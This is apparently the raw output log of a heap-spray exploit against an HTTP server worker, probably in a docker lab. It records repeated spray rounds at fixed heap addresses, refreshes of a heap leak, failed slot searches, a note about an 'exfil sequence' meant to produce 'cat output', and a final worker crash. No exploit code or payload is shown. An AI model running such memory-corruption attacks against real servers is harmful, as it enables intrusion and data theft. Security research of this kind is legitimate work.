+18:35:46Z [#8] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:35:46Z [#9] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:35:46Z [#10] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:35:46Z [#11] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:35:46Z [#12] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:35:46Z [#13] [R-6 spray-slot@0xed3f88a64000] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:35:46Z [R-6 round 1] no slot; refreshing R-1 heap leak
+18:35:46Z [#14] [R-6 spray-slot] ok rawlen=9804 bodylen=9580
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:35:46Z [#15] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:35:46Z [#16] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:35:46Z [#17] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:35:46Z [#18] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:35:46Z [#19] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:35:46Z [#20] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:35:46Z [#21] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:35:46Z [#22] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:35:46Z [#23] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:35:46Z [#24] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:35:46Z [#25] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:35:46Z [#26] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:35:46Z [#27] [R-6 spray-slot@0xed3f88a64000] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:35:46Z [R-6] FAILED round 1 (spray slot not found)
+18:35:46Z [R-6/R-7 round 2] opening fresh worker pin
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:35:46Z [#28] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:35:46Z [#29] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:35:46Z [#30] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:35:46Z [#31] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:35:46Z [#32] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:35:46Z [#33] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:35:46Z [#34] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:35:46Z [#35] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:35:46Z [#36] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:35:46Z [#37] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:35:46Z [#38] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:35:46Z [#39] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:35:46Z [#40] [R-6 spray-slot@0xed3f88a64000] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:35:46Z [R-6 round 2] no slot; refreshing R-1 heap leak
+18:35:46Z [#41] [R-6 spray-slot] ok rawlen=9804 bodylen=9580
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:35:46Z [#42] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:35:46Z [#43] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:35:46Z [#44] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:35:46Z [#45] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:35:46Z [#46] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:35:46Z [#47] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:35:46Z [#48] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:35:46Z [#49] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:35:46Z [#50] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:35:46Z [#51] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:35:46Z [#52] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:35:46Z [#53] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:35:46Z [#54] [R-6 spray-slot@0xed3f88a64000] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:35:46Z [R-6] FAILED round 2 (spray slot not found)
+18:35:46Z [R-6/R-7 round 3] opening fresh worker pin
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:35:46Z [#55] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:35:46Z [#56] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:35:46Z [#57] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:35:46Z [#58] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:35:46Z [#59] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:35:46Z [#60] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:35:46Z [#61] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:35:46Z [#62] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:35:46Z [#63] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:35:46Z [#64] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:35:46Z [#65] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:35:46Z [#66] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:35:46Z [#67] [R-6 spray-slot@0xed3f88a64000] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:35:46Z [R-6 round 3] no slot; refreshing R-1 heap leak
+18:35:46Z [#68] [R-6 spray-slot] ok rawlen=9804 bodylen=9580
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:35:46Z [#69] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:35:46Z [#70] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:35:46Z [#71] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:35:46Z [#72] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:35:46Z [#73] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:35:46Z [#74] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:35:46Z [#75] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:35:46Z [#76] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:35:46Z [#77] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:35:46Z [#78] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:35:46Z [#79] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:35:46Z [#80] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:35:46Z [#81] [R-6 spray-slot@0xed3f88a64000] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:35:46Z [R-6] FAILED round 3 (spray slot not found)
+18:35:46Z [R-6/R-7 round 4] opening fresh worker pin
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:35:46Z [#82] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:35:46Z [#83] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:35:46Z [#84] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:35:46Z [#85] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:35:46Z [#86] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:35:46Z [#87] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:35:46Z [#88] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:35:46Z [#89] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:35:46Z [#90] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:35:46Z [#91] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:35:46Z [#92] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:35:46Z [#93] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:35:46Z [#94] [R-6 spray-slot@0xed3f88a64000] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:35:46Z [R-6 round 4] no slot; refreshing R-1 heap leak
+18:35:46Z [#95] [R-6 spray-slot] ok rawlen=9804 bodylen=9580
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:35:46Z [#96] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:35:46Z [#97] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:35:46Z [#98] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:35:46Z [#99] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:35:46Z [#100] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:35:46Z [#101] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:35:46Z [#102] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:35:46Z [#103] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:35:46Z [#104] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:35:46Z [#105] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:35:46Z [#106] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:35:46Z [#107] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:35:46Z [#108] [R-6 spray-slot@0xed3f88a64000] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:35:46Z [R-6] FAILED round 4 (spray slot not found)
+18:35:46Z [R-6/R-7 round 5] opening fresh worker pin
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:35:46Z [#109] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:35:46Z [#110] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:35:46Z [#111] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:35:46Z [#112] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:35:46Z [#113] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:35:46Z [#114] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:35:46Z [#115] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:35:46Z [#116] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:35:46Z [#117] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:35:46Z [#118] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:35:46Z [#119] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:35:46Z [#120] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:35:46Z [#121] [R-6 spray-slot@0xed3f88a64000] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:35:46Z [R-6 round 5] no slot; refreshing R-1 heap leak
+18:35:46Z [#122] [R-6 spray-slot] ok rawlen=9804 bodylen=9580
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:35:46Z [#123] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:35:46Z [#124] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:35:46Z [#125] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:35:46Z [#126] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:35:46Z [#127] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:35:46Z [#128] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:35:46Z [#129] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:35:46Z [#130] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:35:46Z [#131] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:35:46Z [#132] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:35:46Z [#133] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:35:46Z [#134] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:35:46Z [#135] [R-6 spray-slot@0xed3f88a64000] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:35:46Z [R-6] FAILED round 5 (spray slot not found)
+18:35:46Z [R-6/R-7 round 6] opening fresh worker pin
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:35:46Z [#136] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:35:46Z [#137] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:35:46Z [#138] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:35:46Z [#139] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:35:46Z [#140] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:35:46Z [#141] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:35:46Z [#142] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:35:46Z [#143] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:35:46Z [#144] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:35:46Z [#145] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:35:46Z [#146] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:35:46Z [#147] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:35:46Z [#148] [R-6 spray-slot@0xed3f88a64000] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:35:46Z [R-6 round 6] no slot; refreshing R-1 heap leak
+18:35:46Z [#149] [R-6 spray-slot] ok rawlen=9804 bodylen=9580
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:35:46Z [#150] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:35:46Z [#151] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:35:46Z [#152] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:35:46Z [#153] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:35:46Z [#154] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:35:46Z [#155] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:35:46Z [#156] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:35:46Z [#157] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:35:46Z [#158] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:35:46Z [#159] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:35:46Z [#160] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:35:46Z [#161] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:35:46Z [#162] [R-6 spray-slot@0xed3f88a64000] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:35:46Z [R-6] FAILED round 6 (spray slot not found)
+18:35:46Z [R-6/R-7 round 7] opening fresh worker pin
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:35:46Z [#163] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:35:46Z [#164] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:35:46Z [#165] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:35:46Z [#166] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:35:46Z [#167] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:35:46Z [#168] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:35:46Z [#169] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:35:46Z [#170] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:35:46Z [#171] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:35:46Z [#172] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:35:46Z [#173] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:35:46Z [#174] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:35:46Z [#175] [R-6 spray-slot@0xed3f88a64000] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:35:46Z [R-6 round 7] no slot; refreshing R-1 heap leak
+18:35:46Z [#176] [R-6 spray-slot] ok rawlen=9804 bodylen=9580
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:35:46Z [#177] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:35:46Z [#178] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:35:46Z [#179] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:35:46Z [#180] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:35:46Z [#181] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:35:46Z [#182] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:35:46Z [#183] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:35:46Z [#184] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:35:46Z [#185] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:35:46Z [#186] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:35:46Z [#187] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:35:46Z [#188] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:35:46Z [#189] [R-6 spray-slot@0xed3f88a64000] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:35:46Z [R-6] FAILED round 7 (spray slot not found)
+18:35:46Z [R-6/R-7 round 8] opening fresh worker pin
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:35:46Z [#190] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:35:46Z [#191] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:35:46Z [#192] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:35:46Z [#193] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:35:46Z [#194] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:35:46Z [#195] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:35:46Z [#196] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:35:46Z [#197] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:35:46Z [#198] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:35:46Z [#199] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:35:46Z [#200] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:35:46Z [#201] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:35:46Z [#202] [R-6 spray-slot@0xed3f88a64000] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:35:46Z [R-6 round 8] no slot; refreshing R-1 heap leak
+18:35:46Z [#203] [R-6 spray-slot] ok rawlen=9804 bodylen=9580
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:35:46Z [#204] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:35:46Z [#205] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:35:46Z [#206] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:35:46Z [#207] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:35:46Z [#208] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:35:46Z [#209] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:35:46Z [#210] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:35:46Z [#211] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:35:46Z [#212] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:35:46Z [#213] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:35:46Z [#214] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:35:46Z [#215] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:35:46Z [#216] [R-6 spray-slot@0xed3f88a64000] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:35:46Z [R-6] FAILED round 8 (spray slot not found)
+18:35:46Z [#217] [R-6 spray-slot] GET /f rawlen=491
+18:35:46Z === exfil sequence finished without HTTP capture; check docker logs for cat output ===
+18:37:10Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:37:10Z [#1] [init@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:37:10Z [#2] [init@0xed3f88a00000] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:37:10Z [#3] [init@0xed3f88a64000] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:37:10Z [#4] [init@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:37:10Z [#5] [init@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:37:10Z [#6] [init@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:37:10Z [#7] [init@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:37:10Z [#8] [init@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:37:10Z [#9] [init@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:37:10Z [#10] [init@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:37:10Z [#11] [init@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:37:10Z [#12] [init@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:37:10Z [#13] [init@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:37:10Z [#14] [init@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=14
+18:37:10Z [#15] [init@0xed3f889fffe8] PIN-CRASH/conn-closed rawlen=0
